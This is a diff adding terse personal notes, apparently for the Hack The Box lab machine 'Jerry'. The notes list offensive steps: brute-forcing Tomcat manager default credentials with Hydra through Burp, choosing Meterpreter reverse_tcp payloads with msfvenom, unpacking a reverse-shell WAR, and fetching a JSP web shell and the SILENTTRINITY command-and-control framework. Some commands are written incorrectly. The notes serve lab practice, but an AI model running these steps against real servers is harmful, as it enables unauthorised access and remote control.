@@ -1,0 +1,25 @@
+burp tomcat manager
+
+cd /usr/share/seclists
+find . | grep -i tomcat -->tomcat-betterdefaultpasslist.txt
+hydra -C  tomcat-better http-get://jerry.htb:8080/manager/html
+
+HYDRA_PROXY_HTTP=http://localhost:8080(burpsuite)
+hydra -C  tomcat-better http-get://jerry.htb:8080/manager/html
+
+windows/x64/meterpreter/reverse_tcp  -- small downloader
+windows/x64/meterpreter_reverse_tcp  -- don't need to download
+
+msfvenom -l formats  -- find the executable format
+
+du -hs .   -- see the size of file
+
+
+unzip ../reverse.war  --find the jsp
+
+git https://github.com/SecurityRiskAdvisors/cmd.jsp
+
+
+git https://github.com/byt3bl33d3r/SILENTTRINITY
+
+python3.7 -m pip -r requirements
